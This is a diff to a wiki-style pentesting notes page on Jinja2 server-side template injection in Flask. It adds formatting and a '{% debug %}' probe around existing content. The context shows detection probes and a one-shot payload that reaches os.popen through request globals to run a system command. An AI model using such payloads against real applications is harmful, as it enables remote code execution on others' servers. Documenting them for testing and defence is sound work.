@@ -4,6 +4,10 @@ description: A Python library for routing and hosting a website
 
 # Flask
 
+{% content-ref url="../../languages/python.md" %}
+[python.md](../../languages/python.md)
+{% endcontent-ref %}
+
 ## Jinja2 Server-side Template Injection (SSTI)
 
 Inject the Jinja2 templating language for when the `render_template_string()` function is used
@@ -17,6 +21,9 @@ HackTricks explaining exploitation in detail
 ```django
 {{7*7}}
 {{config}}
+{% raw %}
+{% debug %}
+{% endraw %}
 ```
 
 ### 2. Find subclasses to use for RCE
@@ -39,9 +46,11 @@ Find a vulnerable subclass and replace index `42` with the index of it in the `_
 
 Alternatively, try this **one-shot** that works on Flask applications specifically:
 
+{% code title="One shot" %}
 ```django
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
+{% endcode %}
 
 ### Filter Bypass
 
